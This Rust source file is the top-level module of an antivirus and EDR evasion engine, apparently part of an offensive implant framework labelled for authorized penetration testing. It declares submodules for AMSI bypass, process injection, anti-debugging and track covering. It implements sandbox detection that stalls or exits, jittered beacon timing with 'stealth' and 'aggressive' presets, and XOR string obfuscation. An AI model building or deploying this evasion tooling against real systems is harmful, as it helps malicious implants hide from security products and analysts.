//! AV/EDR Evasion Module
//!
//! Multi-layer evasion techniques for authorized penetration testing:
//! - Binary signature mutation (string obfuscation, dead code insertion)
//! - Runtime evasion (sandbox detection, timing checks)
//! - Network evasion (beacon jitter, domain fronting)
//! - Compile-time string encryption
//! - API hashing for dynamic resolution
//! - Control flow obfuscation (opaque predicates, dead code)
//! - Advanced anti-debugging techniques
//! - Memory encryption and protection
//! - Process injection helpers
//! - AMSI bypass (Windows)
//!
//! # Warning
//! These techniques are for authorized security testing only.
//! Misuse may violate laws and ethical guidelines.

// Core evasion modules
pub mod mutations;
pub mod network;
pub mod obfuscate;
pub mod sandbox;

// Advanced evasion modules
pub mod amsi; // AMSI bypass (Windows)
pub mod antidebug; // Anti-debugging techniques
pub mod api_hash; // API hashing for dynamic resolution
pub mod control_flow; // Control flow obfuscation
pub mod inject; // Process injection
pub mod memory; // Memory encryption
pub mod strings; // Compile-time string encryption
pub mod tracks; // Track covering (history clearing)

use std::time::{SystemTime, UNIX_EPOCH};

/// Configuration for evasion techniques
#[derive(Debug, Clone)]
pub struct EvasionConfig {
    /// Enable string obfuscation
    pub obfuscate_strings: bool,
    /// XOR key for string obfuscation (random if None)
    pub obfuscation_key: Option<u8>,
    /// Enable sandbox detection
    pub detect_sandbox: bool,
    /// Delay execution if sandbox detected (milliseconds)
    pub sandbox_delay_ms: u64,
    /// Exit if sandbox detected
    pub sandbox_exit: bool,
    /// Enable network jitter
    pub network_jitter: bool,
    /// Base beacon interval (milliseconds)
    pub beacon_interval_ms: u64,
    /// Jitter percentage (0-100)
    pub jitter_percent: u8,
}

impl Default for EvasionConfig {
    fn default() -> Self {
        Self {
            obfuscate_strings: true,
            obfuscation_key: None,
            detect_sandbox: true,
            sandbox_delay_ms: 300_000, // 5 minutes
            sandbox_exit: false,
            network_jitter: true,
            beacon_interval_ms: 60_000, // 1 minute
            jitter_percent: 30,
        }
    }
}

impl EvasionConfig {
    /// Create config optimized for minimal detection
    pub fn stealth() -> Self {
        Self {
            obfuscate_strings: true,
            obfuscation_key: None,
            detect_sandbox: true,
            sandbox_delay_ms: 600_000, // 10 minutes
            sandbox_exit: true,
            network_jitter: true,
            beacon_interval_ms: 300_000, // 5 minutes
            jitter_percent: 50,
        }
    }

    /// Create config for aggressive operation
    pub fn aggressive() -> Self {
        Self {
            obfuscate_strings: true,
            obfuscation_key: None,
            detect_sandbox: false,
            sandbox_delay_ms: 0,
            sandbox_exit: false,
            network_jitter: true,
            beacon_interval_ms: 5_000, // 5 seconds
            jitter_percent: 10,
        }
    }

    /// Create config with no evasion (for testing)
    pub fn none() -> Self {
        Self {
            obfuscate_strings: false,
            obfuscation_key: None,
            detect_sandbox: false,
            sandbox_delay_ms: 0,
            sandbox_exit: false,
            network_jitter: false,
            beacon_interval_ms: 0,
            jitter_percent: 0,
        }
    }
}

/// Evasion engine that applies configured techniques
pub struct EvasionEngine {
    config: EvasionConfig,
    sandbox_detected: bool,
}

impl EvasionEngine {
    pub fn new(config: EvasionConfig) -> Self {
        Self {
            config,
            sandbox_detected: false,
        }
    }

    /// Initialize evasion - call at program start
    pub fn init(&mut self) -> Result<(), String> {
        if self.config.detect_sandbox {
            self.sandbox_detected = sandbox::detect_sandbox();

            if self.sandbox_detected {
                if self.config.sandbox_exit {
                    return Err("Sandbox environment detected".to_string());
                }

                if self.config.sandbox_delay_ms > 0 {
                    std::thread::sleep(std::time::Duration::from_millis(
                        self.config.sandbox_delay_ms,
                    ));
                }
            }
        }
        Ok(())
    }

    /// Check if sandbox was detected
    pub fn is_sandbox(&self) -> bool {
        self.sandbox_detected
    }

    /// Obfuscate a string using configured method
    pub fn obfuscate(&self, s: &str) -> Vec<u8> {
        if !self.config.obfuscate_strings {
            return s.as_bytes().to_vec();
        }

        let key = self.config.obfuscation_key.unwrap_or_else(random_key);
        obfuscate::xor_obfuscate(s, key)
    }

    /// Deobfuscate a previously obfuscated string
    pub fn deobfuscate(&self, data: &[u8], key: u8) -> String {
        obfuscate::xor_deobfuscate(data, key)
    }

    /// Sleep with jitter to avoid pattern detection
    pub fn sleep_with_jitter(&self, base_ms: u64) {
        if !self.config.network_jitter {
            std::thread::sleep(std::time::Duration::from_millis(base_ms));
            return;
        }

        network::jittered_sleep(base_ms, self.config.jitter_percent);
    }

    /// Calculate next beacon time with jitter
    pub fn next_beacon_delay(&self) -> std::time::Duration {
        if !self.config.network_jitter {
            return std::time::Duration::from_millis(self.config.beacon_interval_ms);
        }

        network::jittered_duration(self.config.beacon_interval_ms, self.config.jitter_percent)
    }
}

/// Generate a random key for obfuscation
fn random_key() -> u8 {
    // Simple entropy source using system time
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();

    // Mix nanoseconds to get pseudo-random value
    let nanos = now.subsec_nanos();
    let secs = now.as_secs();

    ((nanos ^ (secs as u32)) & 0xFF) as u8
}

/// Quick check if we're likely in a sandbox/VM
pub fn quick_sandbox_check() -> bool {
    sandbox::detect_sandbox()
}

/// Generate a build-unique identifier
pub fn build_fingerprint() -> String {
    // This will be different for each build due to timestamps
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();

    format!("{:x}{:x}", now.as_secs(), now.subsec_nanos())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let config = EvasionConfig::default();
        assert!(config.obfuscate_strings);
        assert!(config.detect_sandbox);
        assert!(config.network_jitter);
    }

    #[test]
    fn test_stealth_config() {
        let config = EvasionConfig::stealth();
        assert!(config.sandbox_exit);
        assert!(config.jitter_percent >= 50);
    }

    #[test]
    fn test_engine_obfuscate() {
        let engine = EvasionEngine::new(EvasionConfig::default());
        let original = "test string";
        let obfuscated = engine.obfuscate(original);
        assert!(!obfuscated.is_empty());
        assert_ne!(obfuscated, original.as_bytes());
    }

    #[test]
    fn test_random_key() {
        let key1 = random_key();
        std::thread::sleep(std::time::Duration::from_millis(1));
        let key2 = random_key();
        // Keys might occasionally be the same, but should generally differ
        // This test just ensures the function doesn't panic
        let _ = key1;
        let _ = key2;
    }

    #[test]
    fn test_build_fingerprint() {
        let fp1 = build_fingerprint();
        std::thread::sleep(std::time::Duration::from_millis(1));
        let fp2 = build_fingerprint();
        assert!(!fp1.is_empty());
        assert!(!fp2.is_empty());
    }
}
